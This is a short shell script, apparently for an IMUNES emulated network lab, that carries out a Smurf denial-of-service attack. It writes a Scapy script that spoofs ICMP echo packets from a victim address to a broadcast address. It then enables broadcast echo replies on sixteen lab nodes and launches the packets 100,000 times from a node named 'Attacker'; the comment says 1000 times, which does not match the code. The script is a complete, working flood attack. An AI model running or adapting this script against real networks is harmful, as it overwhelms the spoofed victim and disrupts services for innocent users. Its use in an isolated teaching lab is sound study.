#!/bin/sh

#create the script that crafts the packet and sends it 1000 times
echo '\
packet=IP(src="10.0.1.10",dst="10.0.0.255")/ICMP()/Raw("attack"*230)
send(packet*100000)
exit()' > /tmp/smurf.scapy

#copy the scapy script to the Attacker
hcp /tmp/smurf.scapy Attacker:

# enable icmp echo broadcasts (default: disabled)
if test `uname -s` = "Linux"; then
    for pc in n1 n2 n3 n4 n5 n6 n7 n8 n9 n10 n11 n12 n13 n14 n15 n16
    do
        echo -n $pc:
        himage $pc sysctl -w net.ipv4.icmp_echo_ignore_broadcasts=0
    done
fi

#execute the script
himage Attacker scapy -c smurf.scapy
